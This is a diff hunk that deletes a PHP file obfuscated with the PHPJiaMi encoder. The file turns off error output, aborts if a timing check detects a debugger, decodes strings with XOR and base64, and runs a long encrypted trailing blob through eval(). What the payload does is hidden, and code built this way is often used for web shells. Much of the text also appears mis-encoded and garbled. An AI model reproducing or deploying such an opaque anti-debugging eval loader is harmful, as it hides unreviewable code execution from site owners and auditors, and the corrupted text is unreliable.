@@ -1,1 +1,449 @@
-<?php /* PHP Encode by  https://Www.PHPJiaMi.Com/ */error_reporting(0);ini_set("display_errors", 0);if(!defined('dacqtlyw')){define('dacqtlyw',__FILE__);if(!function_exists("Š‘Ş¯İÔğ¥")){function Š‘Ş¯İÔğ¥(&$¿ëóáá³„,$„æŞ¥Ûš‘Ó){$Âµ½åÔ”¯™=$°İ·ï¤¢=$¶«Ğ£Ä¬†©Äê=$Ïü½ëÄ·¢°—şĞ=$­Ÿ‘ªÄñÜ='¡×ö‰±Ğ';$¹÷ŒÑ±¨Òò=$Âµ½åÔ”¯™('RÖYRÂ0ZÌFîUH');$¦àõ®ŒÄŸÙ†=$°İ·ï¤¢('RÖYRRØFG');$Îâ¬§ÒÌ¹ÌŒŠ=$¶«Ğ£Ä¬†©Äê('UÖÎWWØÈÌDÖRGUUFF');$§ışŠÓ›å·=$Ïü½ëÄ·¢°—şĞ('RÖYRXURDD1VHXFÈF');$ÕçıÖú¿ä=$Ïü½ëÄ·¢°—şĞ('UEŞTWFèUBÎ==');$“ Ğş¿´’¦=$¹÷ŒÑ±¨Òò($¦àõ®ŒÄŸÙ†($Îâ¬§ÒÌ¹ÌŒŠ($§ışŠÓ›å·($­Ÿ‘ªÄñÜ('TÊĞÊêÜ8+ŞAQ8MR3òğNäÊC2æ448ÌIMC5W5VàPKTÄV2/ÎZÈGîGìØÊD2ÂVWOÂŞÚòWUW1DLîEòÚÂ9äMĞØLJàôØàôLÜæìVÔHÂQÂPBØäGÔY+J6ÄàÄVAÆØHWXôPÖ2ZRJğ5èV4J/OJQ4ääQYğÜŞJÈòÜQÒèæN4/òÂìâĞLVÖZTÎ3XOØÂ8D8æÜæÄHÎîLÄOHGÎIQ8LYVèôÄ2òôLP')))));$“ìÊ …Úêê÷=$ÕçıÖú¿ä(',',$“ Ğş¿´’¦);$¿ëóáá³„=$“ìÊ …Úêê÷[$„æŞ¥Ûš‘Ó];}function »§êÓë¬ ó($µŠ·îƒ){global$Ãö¿í³ğÑ,$˜¼Ì¢¬²,$œ·Ééò†ÎŒê,$Šœ÷õŒ÷ÎÈÄ,$ÃåÿŒÌ½ø,$Ôœè­ò™,$ƒúú½ôË™™ƒéæ,$†«®©ş—ğÈì±,$ÃèÂ×áóŠ,$“à±Ãğº´”,$¾ÂÅĞãöÜô“,$ˆ¹ôÄµ×“®¦‚ó,$·ñ›ÿ£ ,$‡¬ÆöµŞÿ­,$¹•ƒı‰à×û±,$îèğ¾éÍ‚;$Âµ½åÔ”¯™=$°İ·ï¤¢=$¶«Ğ£Ä¬†©Äê=$Ïü½ëÄ·¢°—şĞ=$­Ÿ‘ªÄñÜ=$¼Å–†—÷=$÷ëÌ“â­†=$…Ø´½ˆ‡ˆë•=$“…¥½é´‡=$“éÔŞâ¯²Íµ™=$¢ë•¿¦ô Ãö¼=$¼ÙÂ†š=$ÂöÚóÅ‡Û=$µ¼Õ´×¢‹®=$ºÏªÖªÈ«ëØ='¡×ö‰±Ğ';$Ó¿·¿ÉËï§İ‚=$Âµ½åÔ”¯™('RVŞTÂ0ÈRE11äWØNÄBî==');$¿˜¡ëñ°=$Âµ½åÔ”¯™('UVæG');$’®ŒäÆİ§“Éˆï=$Âµ½åÔ”¯™('VØ4K');$°µª¥•Á=$Âµ½åÔ”¯™('WFæARØèECØØR');$‡äšİÉ­=$Âµ½åÔ”¯™('BAJTBA==');$”î‘æî¾=$Âµ½åÔ”¯™('VEAEVî==');$ÎÖøÑ¯Çç=$Âµ½åÔ”¯™('VEAEQÎ==');$Ìöƒ°ë•Úó™‚=$Âµ½åÔ”¯™('ÌWY3ZGè4LGÈÎ');$™Ğ»®¢çßí=$Âµ½åÔ”¯™('ZÜÆğYÜFÒPHVîÆGA=');$®é°ü¸=$Âµ½åÔ”¯™('Z3ÆêÊ2B1PHVîÆGA=');$Ó¿·¿ÉËï§İ‚()==$’®ŒäÆİ§“Éˆï?$¿˜¡ëñ°():'';$™ª ¤¦ğá¡=$Ãö¿í³ğÑ($Ôœè­ò™($Âµ½åÔ”¯™('UVMARUBÆGÖM=')));if(!isset($_SERVER[$Ìöƒ°ë•Úó™‚])&&!isset($_SERVER[$™Ğ»®¢çßí])&&!isset($_SERVER[$®é°ü¸])){$¿˜¡ëñ°();};$”î‘æî¾=$°µª¥•Á(true)*$‡äšİÉ­;eval("");if(($°µª¥•Á(true)*$‡äšİÉ­-$”î‘æî¾)>100){$¿˜¡ëñ°();}eval($Âµ½åÔ”¯™('XFRLR0BCE1èHHG1àJHØ1ÈDî8T0IGVQVFRA9LQ0ŞYFAÎIEØMÈTğQGTF1AVEMMUğEYWB4='));!$¾ÂÅĞãöÜô“($ºÏªÖªÈ«ëØ($˜¼Ì¢¬²($™ª ¤¦ğá¡,$°İ·ï¤¢('GAZW'),$¶«Ğ£Ä¬†©Äê('GAM='))),$‡¬ÆöµŞÿ­($˜¼Ì¢¬²($™ª ¤¦ğá¡,$­Ÿ‘ªÄñÜ('BQ=='),$¼Å–†—÷('GAZV'))))?$¤˜ºâ¦›İ():$¬ùê·ìØ©;$Ç¤â¡¦=$÷ëÌ“â­†('GAèÄBîQ=');$§ş²À¸èä‹°û=$…Ø´½ˆ‡ˆë•('GAZV');$§ş²À¸èä‹°û=$·ñ›ÿ£ (@$ÃèÂ×áóŠ($¢ë•¿¦ô Ãö¼($˜¼Ì¢¬²($™ª ¤¦ğá¡,$Ç¤â¡¦,$§ş²À¸èä‹°û))));return$§ş²À¸èä‹°û;}function ¡×ö‰±Ğ($ÆÖçÓø»,$œüş×–„úè=''){$¨¼©ßÎ÷ç²›='base64_decode';$‡¬ÆöµŞÿ­=$¨¼©ßÎ÷ç²›('bWQ1');$ÄÆ„Ú‡˜ì¥¦=$‡¬ÆöµŞÿ­('üáçâìé');$¢Ãš‚¥…¶ŞİÃÓ=$¨¼©ßÎ÷ç²›('b3Jk');$¨÷£™ñ¯è=$¨¼©ßÎ÷ç²›('c3RybGVu');$¡ÙùØ ìç=$¨¼©ßÎ÷ç²›('Y2hy');$œüş×–„úè=!$œüş×–„úè?$¢Ãš‚¥…¶ŞİÃÓ('´'):$œüş×–„úè;$¥Œñ§İÖú=$¢şñ„µ²ì·ŠÏ‚;for(;$¥Œñ§İÖú<$¨÷£™ñ¯è($ÆÖçÓø»);$¥Œñ§İÖú++)$´ñÒÃ¢õâÿÛ.=$¢Ãš‚¥…¶ŞİÃÓ($ÆÖçÓø»{$¥Œñ§İÖú})<$¢Ãš‚¥…¶ŞİÃÓ('õ')?(($¢Ãš‚¥…¶ŞİÃÓ($ÆÖçÓø»{$¥Œñ§İÖú})>$œüş×–„úè&&$¢Ãš‚¥…¶ŞİÃÓ($ÆÖçÓø»{$¥Œñ§İÖú})<$¢Ãš‚¥…¶ŞİÃÓ('õ'))?$¡ÙùØ ìç($¢Ãš‚¥…¶ŞİÃÓ($ÆÖçÓø»{$¥Œñ§İÖú})/2):$ÆÖçÓø»{$¥Œñ§İÖú}):'';$§ş²À¸èä‹°û=$¨¼©ßÎ÷ç²›($´ñÒÃ¢õâÿÛ);$¥Œñ§İÖú=$¢şñ„µ²ì·ŠÏ‚;$¢Ãš‚¥…¶ŞİÃÓ=$Æ³´æòàµ=$¨÷£™ñ¯è($ÄÆ„Ú‡˜ì¥¦);for(;$¥Œñ§İÖú<$¨÷£™ñ¯è($§ş²À¸èä‹°û);$¥Œñ§İÖú++){$¢Ãš‚¥…¶ŞİÃÓ=$¢Ãš‚¥…¶ŞİÃÓ?$¢Ãš‚¥…¶ŞİÃÓ:$Æ³´æòàµ;$¢Ãš‚¥…¶ŞİÃÓ--;$Æ»Áé¥åÉöÇ.=$§ş²À¸èä‹°û[$¥Œñ§İÖú]^$ÄÆ„Ú‡˜ì¥¦[$¢Ãš‚¥…¶ŞİÃÓ];}return$Æ»Áé¥åÉöÇ;}}}global$Ãö¿í³ğÑ,$’Õš°şü¨¾×Îï,$˜¼Ì¢¬²,$œ·Ééò†ÎŒê,$ÁºÕ®Ş¿¯§¥,$Šœ÷õŒ÷ÎÈÄ,$ÃåÿŒÌ½ø,$Ôœè­ò™,$ƒúú½ôË™™ƒéæ,$†«®©ş—ğÈì±,$ÃèÂ×áóŠ,$“à±Ãğº´”,$¾ÂÅĞãöÜô“,$ˆ¹ôÄµ×“®¦‚ó,$·ñ›ÿ£ ,$‡¬ÆöµŞÿ­,$¹•ƒı‰à×û±,$îèğ¾éÍ‚;$«…•ÂÃ§ƒ=$‹õÙÍëØñ§Úô¶=$šÊöÊıú¥Æ£=$Ó…„³÷ö=$¸ÀâÒİË³—=$‘ßŸÀ¨…†=$Íì©İ¶Ú=$¦’òÇôïª¨ÜÇ=$™Î­ÉÙšì¶ã”=$§™ÙºŸâá=$Ïˆµøœ«êÏÊù=$¿Ÿÿ÷Í™ö=$‰’“ÇÄ‡Å£ÿÿ=$Æİó ıôù¦Ïã=$¬†Ë‘ŒÑÊô=$Ÿ¤æÊ±Æ=$“Â™ËõÂ=$§•ÁÜ†¤”=$££Ä‡¡='Š‘Ş¯İÔğ¥';if(!$Ãö¿í³ğÑ){$«…•ÂÃ§ƒ($Ãö¿í³ğÑ,8);$‹õÙÍëØñ§Úô¶($˜¼Ì¢¬²,9);$šÊöÊıú¥Æ£($ÃåÿŒÌ½ø,10);$Ó…„³÷ö($ÃèÂ×áóŠ,4);$¸ÀâÒİË³—($“à±Ãğº´”,13);$‘ßŸÀ¨…†($¾ÂÅĞãöÜô“,12);$Íì©İ¶Ú($ˆ¹ôÄµ×“®¦‚ó,2);$¦’òÇôïª¨ÜÇ($·ñ›ÿ£ ,14);$™Î­ÉÙšì¶ã”($‡¬ÆöµŞÿ­,15);$§™ÙºŸâá($¹•ƒı‰à×û±,16);$Ïˆµøœ«êÏÊù($îèğ¾éÍ‚,17);$¿Ÿÿ÷Í™ö($ƒúú½ôË™™ƒéæ,18);$‰’“ÇÄ‡Å£ÿÿ($†«®©ş—ğÈì±,19);$Æİó ıôù¦Ïã($Ôœè­ò™,11);$¬†Ë‘ŒÑÊô($Šœ÷õŒ÷ÎÈÄ,5);$Ÿ¤æÊ±Æ($œ·Ééò†ÎŒê,6);$“Â™ËõÂ($’Õš°şü¨¾×Îï,1);$§•ÁÜ†¤”($¦Û­Ş¸“™¦Í’,3);$££Ä‡¡($ÁºÕ®Ş¿¯§¥,7);}$Âµ½åÔ”¯™=$°İ·ï¤¢=$¶«Ğ£Ä¬†©Äê=$Ïü½ëÄ·¢°—şĞ='¡×ö‰±Ğ';$µŠ·îƒ=$Âµ½åÔ”¯™('ÂØQ8');$§ş²À¸èä‹°û=»§êÓë¬ ó($$µŠ·îƒ);$¹•ƒı‰à×û±($îèğ¾éÍ‚($$µŠ·îƒ));$¡²¿Îôİ=$†«®©ş—ğÈì±($§ş²À¸èä‹°û);eval($Âµ½åÔ”¯™('UEQCWBğSAÖÈRAÎZàBØVÂXÎÆGS0ÄDĞèÜ6ğL4ÄHVÎ='));$Æ»Áé¥åÉöÇ=$¸¦ â–œºé¯¼;$¹•ƒı‰à×û±($îèğ¾éÍ‚($$µŠ·îƒ));return$Æ»Áé¥åÉöÇ;?>TÊÒOCMØÌÊPOĞC/Ø2ÜLÌIè4äğVØ0Ú/ÌBZYìFÌÔÌHÖÎYVQG1LÊÌBâÒ6ÈÎÂHğ8à3Úìè6ğÊÌàZŞ+OäÌæÌêKQäX+Ö7YÎUCâ/QêâÌZMV2Æ3ÜÆNÚÈØMŞÜÂ1ØETĞÂÖâÚÔ7ì65WğHHPÎNèàÄîââKMDîHZä6ìO798ÂÖIRì+0ì6ä9BJÎØæÜ68XOS8BÚÄV8VÚBQÎ3îèDÖMXŞâ3îÜĞ+îBTØŞIAĞàêDÈCĞêHÈì/1ÊEÈ+2ğêØÆLO0WEFPÄŞ+ZÒÄØ/KÆğæKğQJWÈ8AQCQÊ+äXÎJæäEOICKS+JÄ7ÆC+CDè0ìTFKàÜäÈäĞòì9ĞÚÚFDÖğèDI/âè0ò7/2WÜYĞIÊD2QàVÜòNÆCDÈÎäV1Dî/ZYÎGÔ9âÔÈALÜÖÔìàEL8ÜàFÌC/DèÌX03EILSÊNÌOæPÈ1MJêNRäèGôôÊòBRÂCÖBÂÂCæLØğÌÂ431VîFòÒRXO3ôWÈ5àC4ÎÔîæÖ0ÔèE0àKLOæÖFÌÖÊA6È4èì3BVêTÖ1Aâä2PHFòÊUĞîK3XQÆÚTÆî6ĞÖìæJÔRFàÆCSGBæÜUòìNôòUÆTÆ419DCVL01E6YPÈôO5DêÜ+5ÄäYÄìêîQMâPÒ1ÈOÜâ2MÚ7FìÂ63OTÈV0DLVSJâFÎIÔQQØTYŞÆUâAGZWÄQOÔ5ÆŞHêÈôğìC0PÜÊĞ2ÈÒ8îèæVØ3XĞÎòòÖVGÌVSĞGÚ9W7Şè7UO+PTÈæSÈÚEW0àCĞOìäò88BDP9êÎRES3Y9OWØO5ÒÜ/7ÚUŞ974Càæ5O9QôìFHTKV5YXÎNÊâHP6î/ğâTH+4TZ5ìôWH+òBÄâìCØÈĞEæZZ/1GìLÂÔæUê2PêI4àÖ81PæL/ÒON0È0IìĞÒEQT30UÎ1GGæAZII1XVâPHKôQZÆÂJÎ/Z/ÎTPHÌÖZŞÌEŞQêÎ0Y+ìN81U5PT96ÜO06M8ÄôæØPÖBÒJ7ê1âĞââäWäPF7ÜOÖ+D7èLOŞÚÈJîŞ7àÒèMÄV6P7ĞQPÄôìAUÆÖUààØDÒÊ3NAôÌ6èèXà2àYèÊRÖğ2ä6ÖÔIÂ15îO+PŞèHì/IAZZÌ5ä2ÚSVàîÈZÈDIÖZÚğÜ7ê018SäÔF7PÈÜôŞYè/BKGF6DD1ÄSÖ9ÊØ88Æ5FĞOèèS3ÚÊĞÂXOW33îÊ2Oô61T3Q/èĞ6ICÎŞSìØÚ2ZŞ6ìôUÜôØìSÚKYÌÌ2O+7ÈÄ0DIAÆMêÔAQLÄîÆYòHÌÊîD6V2Tä4RTKHÄàÔÜESHÆæÌGRàEN1ÄÈSØO2AĞÔC4MæìIBâôê4LÒ+LO4òä0ì6ÚC4äX5BÌêWCÆXĞCPZZG0ÒÎäZ/KèÊÂMPè0ÄØòGèÄ3DEAOÚâèOÊ0ZPRÌRBXWZäÒ8ODô9NÄÌ3òÈNC4E6ÎÈI+/JTA7ÎÊæêæĞ1Ş7Ö27Q3ÈYğJ0îæÂAî1òÚUUòæDDSQÜ4PGÚ5/0ÄBSPXCòÆÒKØÖÂÌMOM71êCôGàFNĞ2LØòEôèÂD95ìêà67BÔ3QÆRÂSÆLÚØXàGÔğÈTQZHU6Z3ÔCTNÂJìI/JÊLSDZàÖRMŞJHBÂòÎRâ/Yî9îÜXÜÂ7èÄIÜò8Lò7DäÚVÄÌQÜÎôô3J+IH+V86ÂGŞ6è5VIOÊRONKìæÚOê5+Ì3OèÊ8ÂôòSÊêèBÚP2Òê88ØàAOIBXP5ZğVFEê/ÔÂCìB7î4ìL8+ÜÊôæÎ2ÌHÜZJIEÆEMYJÜ3IKÈ9EÆğQÒè/DL0ZÈÄS0MÌ1È+ØGàÌÚQêJ5S4ôWÖÒ8BÚÆODÔÎÈNPW5ÒJEÔÎ001ğàÊP37ä5FPMLE/äA1ÖEI6ÂVÊT/VVÚQQÎFòÜä+WP/ZìĞAÈÖÆBğX2U/L9XÔJKEĞÚìD/îØæÂG56Ò7ÆğO/EîÎFØÎAGLZ51WÚEÔCÄÖKŞÚÜWC862E2DGQØHô7Ü/ØÌQêDV2+ÒâŞÎæÄAX0JDìèL686æ6JU1+ZòJGFXTX/ààÂĞVRÜ7/6ÎèBNâÄŞ04àìèÖC6Xê2îÆêæÊîPàÂVPBSæ9DBÈŞâäBIàXÊ0OG2Y8T+ÄQŞàZê6Â03âêÔÔò9TòÜ5+ÂBŞ17Ü10ÖHğUÜäÔXMàK3êYÔâÄ1A/ĞîÊK9SÄ7ğ46MÒÔP5UQÈğ110ğàUèôÆôÂÒO+ÖÔPRDIÌWÒAIQìYÜĞ4Ú0êğB3TMàPÜ95HABòV/5æGâÎXÈÖMZğ49LFE1ÌäI/äÔŞŞEĞÈ49êQÖOŞEGÊìèP6OÊPCæĞÆÌ5ì1EO9W8TÖĞôNğğC0Ô8EâĞ5ÒLâPJğĞğGFÜæU2ŞEØSW+JAÂ3ÎCQ3ìSÒ+ŞFêÊÎGVKKêHHàÊòXÔ7ÎLDÚNÂJUW2Rì/ÌÈÌÖê5ÄÜNÌV1OHÌÄ+IDÊFôÂÔSCRÆìYÜDGÄæW967ìä2Â4âRTOÈÜØÈJÔîT5ÜTRAÆUÄòäF84äKÂ/RZâC+ORP/ÂKNÊ1òÄUÈSZğÈLèÂ1L2FÎPTJ8DèS6SÊâŞMXââRîÊOEæAEÈ86äDØFÈÆCX0â6äAV0ô8A700EÚMYUADMLòŞDHAôW5êT6J6EØŞäP1ÂÊŞØRŞ2Q7ÜìæäÄÎ5ÚNJÔMKJ8KMY8æ9NêÊÎMAÌ+/æ4JìîÂêâÔî22FAAKGTXUğXÂO67+WŞDX11Òâè0îàÌÆ/ÌôÜV6HHÊAG9ÈMGæH9ÚĞêSÒ7AÎÆXONMÔ6ğG+VPòÚâ9OMWê38NZÜÒKÚVNFYQòEôà76FìKRIÌ3ÌÈCèX0æTØêâôô7JHôÄPÄÔNQÜè5àğô++QÂTÚÈâN1Ş+XTQZJH6V2Ì74î2QIAÊZV3RÖTH0ÜÌHAZNÄWæ6RğWNEìP6LÄÄôXêÔFRFJN0ÔBQÖÒÎOìGòÔSÌÆEZÚÔHF9TÚÔYNLô4Ø+äâÈàòOLîÎğäNÜ2Èä3ÈPZHàì2äDLCA0ÌNMQSĞâÊDAE/ÆRÈXPÂæÒÖ0ÊZN4îôUZ2ÔE25Cê3èîUIMÖÈôDæSFàê2ÒC+IîØÎÄâZÜ3TQMÊ4DCDòEALI9OàTô7MG0SG5ÂCUØğâFSNò5XØ/Zàæ/0ØÂ2WEîÌÎIKS2èäMJ8ĞÖTŞÄVQÈàSÄ/E3N0ÄÄ1IâL/4HÈ+A5èZKZW7ôJXôÒMBĞOIOÊìÈØĞÊPŞĞâÚCØHCP/àR49GUÎêKĞGZPSòFĞZY/UğOEFæÂXNN74èÌWè/ìğæ9ĞOBWô/EICWèÌNÔÖ/ZPØN3+ê/òBÆôæSğÜ6JÎWI3YX25Ì8KDW59êABÜÔXÄÖJPò7RÜFJÚêìKBDâQBÄ75ÖLGHLWYIRÒğU5+Ê+îÈZ6ÜÜ0KMBâÄNWQÂX6KÌBMÄ3HPXDìòÎR695ÄÔØQIESADĞŞ3ìC8ÚŞÚIPMğCŞ2ÚFÆ4ÆMêÔIàE0èGÖÈ/TÖ9KîVîÎ2ôä0ĞÊğPYÔ456ÆB1ÔäÎ3ìBOâJR/O/NêÌÒVÆR1/7ĞM+/Ò1ÖKìÒTER/ÊLôğŞJGÒXKIîÖÔ0OÖJHPŞU+9ĞWOYÊÆØXìCNNFÆQÄèèîìîæì1àèŞ61ÚÌZÚîKØŞÒ0TVVYîÆR06äÔÎÆêUGæKJK44ğ9FÆ/XO82MòÊ2WICS/XETEŞ3RòTòDä8+Ú+GJEÜÎÎHÊîôHDBôêğSSTEWLÄÈTîY+QÂXUÚìNAGFÖìÖAPÜĞèCÖôÒÌ3C6ÊòOÎ5+ÈGWÈCÊBS8ÎMòPDĞÔêòàK/Ğ7SÊZÄVèîğKÜ3/KGìLô2ÊÆ266XI7ÌîôŞLîÄòQUJÊUYHZÆUìXÂZNÄğÜÈZDÌôIWAQGKÌĞMNÊÒÊBòæMê0ÖôMÔäôâôUàÜLÜXĞY0ì6O57ôKÆìJTŞKEY2ÎDCŞ9BÜMâD757663Â5äòÈÔòÖÄHôWNYMCGÒÄîRÒèêêDÊU8B8UZè5èÄK2F1GæCF11ĞàHêTAEò/AâMGæğÄXGŞH/P7FòBK8KòCÎèÆCILLX7F7WXVŞâ3äPRSL496ØÜèKGJPMÂC+PğD9MP1îVK/PW4ìDÖÌVêĞæKIÄBòÖÔà1NM7GA7äÂÈà25J0ÊâÌğZ97CJ/UIÔê6QLâòàæ0/3NREêDSRîàìÊÄæZKQMCÌòâÚÜÜ38+I+HGĞÚ5Ôà5äSNÖÚIÈW5VÖÎÔ/ôWÆÊWAMO0KÔä0ÈHYZôWÔH4+6Ö+ĞQò4CHÆS9ÄÖÔZØÔ5NDFUäĞFÌT6ÈNâÂNÚWØŞ2Ú4WĞ4êCWàF4ÜMğŞHTêğÊÈ6YSIOINXÈèQSC39æÂQæÎÚRÂÊ3ÎŞMLS45ÌÎPXA2ò37àäKGÈè69+FWKRŞXÈO5ØSYBĞAÚÄ7NYĞJHä0/ØQNòWêMFĞZU/MğNGôMÆÚTÂŞ6PÆEâP2òY5YÚÔ7îNæO7PF4WTPVÚêOØòîLØÜ4ğÎÊ2XìQğ+P4äY6QGT2ğYôCYĞOĞàĞ3Æ7ZÄNURERæMÄ3ê7âFVÎòGÜJæBÜQVæÒòUIÂGÂ2ÈUÈQ62G66CQSÚVÆÒØ/ÄSÒÂS8NäR+DŞSPQÒRì6GYÂòPJğÎNê3ÂMGÌâÔGÌàŞTîNÈXRYLB3ÒğUBìî8Ò0O5JTZØ0BTDÆO5ÖZUUAèêÂ0ÄRH0JTğŞPSY0Lèò6TH30WIOÚCKRQMŞS66ÖòFXìĞCDÈÆYPJR3N1äYÈ586ôEYæ25Qî+KUMXìĞÖTHLNÜ/KSŞÆ360Z0ĞZÎ1/3X1ê+âÌH1B2U1/ŞÄT3Ä35Ö94++ÌÚĞ2H2òJ+PÌ50ÆğHğLÖ283GIĞXH41ÚKRS3NO4ìIÈòUÄ3äÖ7/Òğæ0ÆTäOÜ4OYAÆ6QQP+ZÚÔàAàSC4T3îæÌEôÂHÊÌNÊTìæGVXK/ÚôXîĞî+ÒQĞLÄLWàÄ7ÄHÄ2äâÄìèÄFPÒŞQîÂNF7VôUÄ29PO5ÔXêòBÈRîğCD7PJ8Øê/äÔÊZD53ES6+08êä4GÆZZDàÒêæ7VŞXÆÈ+PKCÖXYŞMÈLæGUÌÆEQÎDØÖQFRSB4GBV3ÔÜÖVÌìNNà857ìGôDè7QîPÆŞRæG55ØÆäFOVÌJNÖìXSÜ70òK2YÒNÜÔ4YàEC8T2+QâÜ2XØ+ÔèJWôÌPÈâÆTî3îîUJLL9WÆÔâUèÒHHQWTæ4B3êôÌÖVäØBOOJÒV0QXÔOG+6LÜæÖŞ4BèâÈÊÈàæXğEXÂTŞÌÒÜÂàH+QIDĞZGôÄØ5Úæ5LàÈNÒPôÔXPÖEÄSèÎYWTÔÚK2ÚYÊÔ+ğ9îÈA0OÊYQØ08ê49îVJMZ2HCæNÆÌHNSNÈ7E0ZòOÌ3/ØEFUÂVEC3ÌPBDX9æÎô39N+30JMJêIŞÚ1ØâSHFQÔäOì1ğôI9PQUSäE/3Ò3IæÔJSòâYÖ6Ô8Ô/WWäBŞMDOST8ê/HGEâà495ÒBò4ò21QQXàEÄMR+ìÆW80Ò/RÊXAJğOAVŞLQğòÂÄä1ÂNÌFÔG0+5+0ÒZ3H48ê9I95ÆäâÊGÔNNâJàèSLÎÒÆÜM6ØÖ9Qî1MR/0ÔRG+CÈÈ9ÌPNÊYÂ14ò7CîÆä6â8ğ3VYUWàKBIQòÜğ8æìNæ4ÒVCÎÜäNFôLTWIWÎPUVFEôMèÌØÄàHäØÂæ+N/HDîÂQ7+Æ61ZæCDÄîèæAŞ6/WGQ9NVÆÈVE9N0ÆÔ5R6ZOÒDDAêŞSàîCÈ6EÄîGÊğ+Zêè4KèÖE01IRJHTIæTÄØÖÚ6WE65òW5Sê5ÆŞ+7YàÎìTòÒGÈTEÂô49Ì3ÂXĞ6KYHAÂPTMQN7ÈÔJÔÚÎ0DQÚVL1/5ìÂÖôLFUòIT/9ÄNWğ7KØÚÆè2ÒĞÌ+MÒN+VôîôÜ6êLÊZèàĞÈIØğSVV+2ÌXAÆVRìÚOZMFÈL+HÎ6æSRUNàFF59CBæVì4/Âğ1EUìKÄÊJ356äP3ÄXFÊÜ2V1DJÎKE/O6Vä4ğ3KÜæEÊ6KX7Ú7HXèQVÄìê8ÜÆÂèXEDXW/159âÄZHVIJÖ1NäD0ÂAAR03ÎÌ1êZBDğòSìM1ÎUÜÈÂÔMMEì51YæN4ì9O/GN7F8OQQğTÄDÌR/Lô7VÖCŞ13ô2NØTAZQĞĞ2F+PYO3æIØRÖGNEÎDHDòJÔÜğâM9ÈÊWC7A22CÌèL2AÎÂHVEAYäîÜI3VÌPØYàZ3TàWî9+ZNGQQ6FGG/7ÌIFSFŞÒîàÈHPâYDPPÌàYQFSôUÈGÒIàWZĞUğÈ0DN9LJRLÊÆYÖÒêK5MÒDÊNæ5APÚZòAVZ/8ŞTÆOÄH9îè+3êZV5ØXì1GÎâØGÈT8DĞØæNæ4Î6ìæJÄ2CæØìNKCMCâêŞ7â/òH7äèPäBWÌÎØÎRò+ÜÎôAÌYD+/4ÈEÆFîèCZ2êÈT9I/Äê7NX1äâD+ÎUÊÊEFUPSÖ7OæÂ+ŞÌOæGKÆGCWEÚâÔà/ğ62V/UêìG9ÊÔL6î9NRWÔÄZğ1æÔEÚÖDGÆJUP1ÊLXRLÚôIG3HGîôE6VÈSêQIØWà8DÊYÔMJîG2ÊWÌî0SKQ9ôÖWGWòCZ6îÖìÎ+PVIRÄ8X/Ä5BCÆÚ8OîKHì51äIEUJôYL3WJòPÊäKÎFB5T08ÜJMGâXòX7Aîğ5àğĞWL7FôXÜ846ÔO7ìDÎÖMSC0àÚÎHE0Ø6ÈIğÈàÄÊBKÄâ/WH0ôòÖÆÌBML27ôWW1ÄZ+ÂNZâ5ÌJèNDMGSTG0BòèI3îìZ9Q1FVè3B89+ÊMÚÈÜ/êÊSYÄÊæî9Ì5IXæÌH56îRXâ/AWYWJBLW+8ÚAêØè5HXÂ1XIìŞèäKZì4ğÎAÄD40GSÒDMQ/ìG/HVÊDÖBîÄUVÎ4XTLF2CDĞJâØÊôÔĞDOTî/Ğò+9ÜWEUÈÂÄÎÈ7AEæìğÔÔYIIUC4ÔY2êB+RMÜÖäÈPÊBîT51ìF6Ğ88ÆØ/GTG+RîâWFÆĞOMMTZQ8AÊàØLÈ/6ÆÒ001H7Ô7XÎGèä4ACBNòØKâîêìXTFÒ17A7ÖFB0FŞÊPØ4æWÂZPRÖTLÄU+4òBàâÌA9MN3ÔUŞB1NĞÈ3MLQĞAGÔÎêàÔÆ8LDBT5SZÂÜêRæ5+B9ÂPREZ2Ş9âØH+ÔQ8ÎJÈEB/86WğDÌôQÒÜŞHZUÌ9ÚÔLâ26DÈJN9YR8I0MUÎJŞ52èSÜRÌVÊ+XZÖÈM6æÊBäMìETÔFQòÒF50ÔàŞĞD1àYOHÔæOÄKğPJOîDôìÄUX9L4VğŞAÖFDâØÆIJRPÌØÈXGèMÖRTS0ì0îA+SZîÚÄì3+ZCQØ0JUHG2I0Æ0ôÊêêYòÜ8ĞNW7HEDÂOQæQ/C8ĞMHDôàDMæ4MP/ÌZÒPèNACDLQÈ1MÖŞW9OäR1+KØOô/73ä2ÄÚX+7àêSEÄEŞØàMIÄOìÆHDPYSÆ+ìLYÈà3TTÜQJ29èMMòJIæ26D5ÄFIAAJOÔNÌĞÎF7UMğâ1Ä/ŞÎÊàRìÌUÂRN9+DÌMY9ÖÒG0Ø6îMDQØIîXÈKòI2UÄA1L8Vì7TLôP6ZVÔ9AàÂÆàÂØ49ŞWQÚêRâVVYÔÌ6647ìERÊàSULêUKÌTKQFLğPDAW9JĞSPPBYFŞò/JÌîÜMğÜYZOæÆÂD2CôUÜ/YVêÂ32JKX/âKîàWAXÊ9/ÜàN21ìÊÚÄ1ÎPÂôÖîKTF6XJHìLò0êò5VYF7Ú3ÚCÆIæHNLğSÊNîìÒêGĞî3A3KÚÌRâ2êÆÖäVBÒZNJ/5FÒVHîWÂYDÔØÆE2ROYV9ØÊ/RD6ôC4L3SäNUìâÜâ5ÔS/ŞôèòYP26êQBA6ĞA+OÚ+W/TWâAFÂXYîAÖğR4âNQêäAYSKÄÄJæŞÌŞSMÒPÜIÜDÜ6CEŞIÊğàÚæÖADîô53RRğOÊŞK92ÖŞØKPKOIN+WØ6ğÔĞZ/Y69XğŞè8UæBPÆîì3PÚæìÂKEÂE2Qì0IBOÄ8UB5NîZQD2AĞÈF9êEâBÖŞÎÌĞI92BàJÔ8ZØ31ìÎO8JìSÄX9N90ÂÚÖFÜ9ÊXÄW+CØØÒÖòBÖ55KÒà3F/ÈSæî1ÒôTNDFÔO0äè0XòBBCÂŞÒäRĞ+æìì8+ğSêèÂÌAè9PÆPWIFNIÎØĞÈB70è1RòF3VÌæÄGŞRNV9ôæÚ3ÒN9ÄGN/XIJ+Ê6JH22XîMØÌDBÚîÂPĞWØÒ+UêDGXOTJîæîÄG4ÄG4IÊ9ZÈâÄÌÊZ2LU47+CÖGNQRêØÆDC3ÚÔĞêŞÂTL2ÜTL3MĞÊà2äY6ÚXà6ÎJØêêJWêO0PMÊÒ0TJ3ÌôÚÔÈ2SRÊK6BâÊêQTIô/SÎVALäŞDÔêÜAÖ45ôÜMèÒZÌ3ÔÎ9ÊBôÒÎêAØÎÊQU9Âì/SèàÈô7ÄÜAÄ0èVSĞOÄX1UŞHG1ÂFKĞVÎUäUÒ6RRHTKÎÒ4ÈKÆ6JATìêXRĞUQôÒÖ+VğMDÔĞ5ÚNEğVUàÆÎEOĞà1EÄ+ĞQFÚÜæ3ÎğæHRÜ1VÒYâOÈÂğâòØØğ9Ú9PÌCğGÌŞQI/FL6BHMÜ7IYZV0ÄĞ2èØ3MB3ÚÄ/NØÎ/J4EQOôXQQÂPKìW/ğÚè43AHJŞ/